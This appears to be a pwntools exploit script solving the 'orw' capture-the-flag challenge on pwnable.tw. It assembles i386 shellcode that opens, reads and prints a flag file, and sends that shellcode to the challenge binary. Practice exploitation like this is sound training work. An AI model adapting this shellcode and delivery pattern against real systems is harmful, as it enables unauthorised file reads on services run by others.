#!/usr/bin/python3
from pwn import *
def conn():
	if args.REMOTE:
		io=remote("chall.pwnable.tw",10001)
	elif args.DEBUG:
		io=gdb.debug("./orw")
	else:
		io=process("./orw")
	return io

context.arch='i386'
flag_1=hex(u32(b"/hom"))
flag_2=hex(u32(b"e/or"))
flag_3=hex(u32(b"w/fl"))
flag_4=hex(u32(b"ag\0\0"))

sc=asm("\n".join([
'xor eax, eax',
'mov al, 0x5',
f'push {flag_4}',
f'push {flag_3}',
f'push {flag_2}',
f'push {flag_1}',
'mov ebx, esp',
'xor ecx, ecx',
'xor edx, edx',
'int 0x80',

'mov ebx, eax',
'mov al, 0x3',
'mov ecx, esp',
'mov dl, 0xff',
'int 0x80',

'mov bl, 0x1',
'mov al, 0x4',
'mov dl, 0xff',
'int 0x80'
]))
io=conn()
#io=gdb.debug("./orw","b *0x0804857d")
io.recvuntil(b":")
io.send(sc)
io.interactive()

